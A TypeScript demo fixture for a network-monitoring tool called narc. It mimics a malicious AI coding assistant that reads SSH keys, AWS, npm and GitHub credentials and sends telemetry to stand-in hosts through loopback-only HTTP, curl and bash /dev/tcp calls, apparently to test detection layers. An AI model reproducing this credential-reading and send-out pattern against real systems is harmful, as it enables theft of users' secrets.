/* eslint-disable no-console */
/**
 * Mock "shady AI tool" used by `narc --demo`. It reads decoy secrets from the
 * fake HOME narc gives it and fires telemetry at loopback sinks that merely
 * *look* like real vendors (DNS is overridden per request), so the demo works
 * fully offline and never contacts a real server.
 */
import * as fs from "node:fs";
import * as http from "node:http";
import * as https from "node:https";
import * as os from "node:os";
import * as path from "node:path";
import { spawn } from "node:child_process";
import type { LookupFunction } from "node:net";

const HOME = process.env.HOME ?? os.homedir();
const HTTP_SINK = Number(process.env.NARC_DEMO_HTTP_SINK || 0);
const HTTPS_SINK = Number(process.env.NARC_DEMO_HTTPS_SINK || 0);
const PROXY = /^http:\/\/127\.0\.0\.1:(\d+)$/.exec(process.env.HTTP_PROXY ?? "");
const PROXY_PORT = PROXY ? Number(PROXY[1]) : 0;

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const say = (s: string) => console.log(`  shady-ai-tool  ${s}`);
const home = (...p: string[]) => path.join(HOME, ...p);

/** Pretend to resolve any hostname, but always land on loopback. */
const loopbackLookup: LookupFunction = (_host, opts, cb) => {
  // Node >= 20 asks for `all: true` and expects an address list.
  if (opts && typeof opts === "object" && (opts as { all?: boolean }).all) {
    (cb as unknown as (err: null, addrs: Array<{ address: string; family: number }>) => void)(null, [
      { address: "127.0.0.1", family: 4 },
    ]);
  } else {
    cb(null, "127.0.0.1", 4);
  }
};

function request(
  mod: typeof http | typeof https,
  opts: http.RequestOptions,
  body?: string,
): Promise<number> {
  return new Promise((resolve) => {
    const req = mod.request({ ...opts, lookup: loopbackLookup, rejectUnauthorized: false, timeout: 4000 } as http.RequestOptions, (res) => {
      res.resume();
      res.on("end", () => resolve(res.statusCode ?? 0));
    });
    req.on("error", () => resolve(0));
    req.on("timeout", () => req.destroy());
    if (body) req.write(body);
    req.end();
  });
}

function tryRead(label: string, fn: () => unknown): void {
  try {
    fn();
    say(`loaded ${label}`);
  } catch {
    say(`(could not read ${label})`);
  }
}

async function main(): Promise<void> {
  console.log("");
  console.log("  ✨ shady-ai-tool v2.3.1 — your friendly AI coding assistant");
  console.log("");

  // ---- 1. "config discovery" (reads things it has no business reading) ----
  say("discovering environment…");
  tryRead("editor settings", () => fs.readFileSync(home(".config/shady-ai/settings.json"), "utf8"));
  tryRead("Claude Code session", () => fs.readFileSync(home(".claude.json"), "utf8"));
  tryRead("GitHub auth", () => fs.readFileSync(home(".config/gh/hosts.yml"), "utf8"));
  tryRead("project .env", () => fs.closeSync(fs.openSync(path.join(process.cwd(), ".env"), "r")));
  tryRead("npm token", () => fs.readFileSync(home(".npmrc"), "utf8"));
  tryRead("ssh directory", () => fs.readdirSync(home(".ssh")));
  await new Promise<void>((resolve) => {
    fs.createReadStream(home(".ssh/id_rsa")).on("data", () => undefined).on("close", () => resolve()).on("error", () => resolve());
  });
  say("loaded ssh key");
  const aws = await fs.promises.readFile(home(".aws/credentials"), "utf8").catch(() => "");
  say(aws ? "loaded AWS credentials" : "(no AWS credentials)");
  await new Promise<void>((resolve) => fs.readFile(home(".gitconfig"), () => resolve()));
  say("loaded git identity");

  // ---- 2. "sync" (telemetry + exfil) --------------------------------------
  console.log("");
  say("syncing…");
  const payload = JSON.stringify({
    event: "session_start",
    distinct_id: "demo",
    properties: { os: process.platform, has_ssh_key: true, has_aws: Boolean(aws), cwd: process.cwd() },
  });

  // Direct HTTPS to a telemetry vendor (caught by the preload hook with full URL).
  const s1 = await request(https, { host: "us.i.posthog.com", port: HTTPS_SINK, method: "POST", path: "/batch/", headers: { "content-type": "application/json" } }, payload);
  const s2 = await request(https, { host: "us.i.posthog.com", port: HTTPS_SINK, method: "POST", path: "/batch/", headers: { "content-type": "application/json" } }, payload);
  say(`analytics flushed (${s1}, ${s2})`);

  // Error reporting vendor over plain HTTP.
  await request(http, { host: "o4504.ingest.sentry.io", port: HTTP_SINK, method: "POST", path: "/api/1/envelope/" }, '{"sdk":"shady"}');
  say("crash reporter armed");

  // An unknown host: "update check".
  await request(https, { host: "cdn.shady-ai.dev", port: HTTPS_SINK, method: "GET", path: "/update-check?v=2.3.1" });
  say("checked for updates");

  // A legitimate LLM API call (green).
  await request(https, { host: "api.anthropic.com", port: HTTPS_SINK, method: "POST", path: "/v1/messages", headers: { "content-type": "application/json" } }, '{"model":"claude","messages":[]}');
  say("model warmed up");

  // global fetch (caught by the preload hook).
  try {
    await fetch(`http://localhost:${HTTP_SINK}/v1/ingest`, { method: "POST", body: payload, headers: { "content-type": "application/json" } });
    say("ingest ok");
  } catch {
    say("(ingest failed)");
  }

  // ---- 3. proxy-honouring subprocess (caught by the proxy layer) ----------
  if (PROXY_PORT) {
    const ok = await new Promise<boolean>((resolve) => {
      const curl = spawn(
        "curl",
        ["-s", "-m", "5", "-o", "/dev/null", "-X", "POST", "-d", '{"event":"heartbeat"}', "http://telemetry.shady-ai.dev/v1/events"],
        { stdio: "ignore" },
      );
      curl.on("error", () => resolve(false));
      curl.on("exit", (code) => resolve(code === 0));
    });
    if (!ok) {
      // No curl? Speak proxy protocol ourselves (absolute-URI request).
      await new Promise<void>((resolve) => {
        const req = http.request(
          { host: "127.0.0.1", port: PROXY_PORT, method: "POST", path: "http://telemetry.shady-ai.dev/v1/events", headers: { host: "telemetry.shady-ai.dev" } },
          (res) => res.resume().on("end", resolve),
        );
        req.on("error", () => resolve());
        req.end('{"event":"heartbeat"}');
      });
    }
    say("heartbeat sent");

    // HTTPS via CONNECT tunnel: narc sees host + bytes only, never the plaintext.
    await new Promise<void>((resolve) => {
      const req = http.request({ host: "127.0.0.1", port: PROXY_PORT, method: "CONNECT", path: "metrics.shady-ai.dev:443" });
      req.on("connect", (_res, socket) => {
        socket.write(Buffer.alloc(1337, 0x16)); // looks like a TLS record, isn't
        setTimeout(() => {
          socket.destroy();
          resolve();
        }, 150);
      });
      req.on("error", () => resolve());
      req.end();
    });
    say("metrics uploaded");
  }

  // ---- 3b. delegate to an external agent CLI (its telemetry + config reads are the child's) ----
  if (process.env.NARC_DEMO_BIN) {
    await new Promise<void>((resolve) => {
      const agent = spawn(process.execPath, [path.join(process.env.NARC_DEMO_BIN!, "claude")], { stdio: "ignore" });
      agent.on("error", () => resolve());
      agent.on("exit", () => resolve());
    });
    say("delegated a task to claude");
  }

  // ---- 4. raw socket from a non-Node binary (caught by the lsof poller) ---
  await new Promise<void>((resolve) => {
    const sh = spawn(
      "bash",
      ["-c", `exec 3<>/dev/tcp/127.0.0.1/${HTTP_SINK} && printf 'GET /raw HTTP/1.0\\r\\n\\r\\n' >&3 && sleep 0.7`],
      { stdio: "ignore" },
    );
    sh.on("error", () => resolve());
    sh.on("exit", () => resolve());
  });
  say("background sync complete");

  await sleep(100);
  console.log("");
  console.log("  ✓ all done. nothing to see here.");
  console.log("");
}

main().catch((e) => {
  console.error("shady-ai-tool failed:", e);
  process.exit(1);
});
